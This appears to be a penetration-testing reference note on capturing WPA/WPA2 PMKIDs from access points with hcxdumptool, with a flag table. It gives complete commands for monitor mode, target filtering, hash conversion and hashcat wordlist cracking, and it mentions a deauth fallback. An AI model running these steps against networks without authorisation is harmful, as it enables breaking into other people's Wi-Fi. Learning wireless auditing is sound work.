---
tags: [pentest, wireless, pmkid, hcxdumptool, capture, both]
tool: hcxdumptool
phase: 5
---
# hcxdumptool — PMKID Capture

Capture PMKID (Pairwise Master Key Identifier) from APs without needing a connected client. Works against WPA/WPA2-PSK routers that respond to RSN IE requests.

[[10 - Wireless/00 - README|Folder index]]

## Install / verify

```bash
which hcxdumptool
sudo apt install hcxdumptool hcxtools
```

## Why PMKID?

Traditional WPA cracking needs a 4-way handshake, which requires a connected client you can deauth. PMKID is sent by the AP in the first EAPOL message — no client needed, no deauth needed.

## Capture PMKID

```bash
# 1. Put adapter in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Capture (runs until stopped with Ctrl+C)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# 3. Filter to target (optional)
echo "AABBCCDDEEFF" > filter.txt    # target BSSID (no colons)
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist_ap=filter.txt --filtermode=2
```

| Flag | Meaning |
| --- | --- |
| `-i` | Monitor interface |
| `-o` | Output file (.pcapng) |
| `--enable_status=1` | Show status messages |
| `--filterlist_ap` | File with target BSSIDs (no colons, uppercase) |
| `--filtermode=2` | Only capture from listed APs |

## Convert and crack

```bash
# Convert pcapng → hashcat 22000 format
hcxpcapngtool capture.pcapng -o hash.22000

# Check what was captured
cat hash.22000 | head
# Lines starting with WPA*02* = PMKID; WPA*01* = handshake

# Crack with hashcat
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

> [!tip] Not all APs support PMKID
> If `hcxpcapngtool` produces no output, the AP doesn't send PMKID. Fall back to deauth + handshake capture.

## See also

- [[04 - airodump-ng]]
- [[05 - aireplay-ng Deauth]]
- [[08 - Hashcat WPA Mode 22000]]
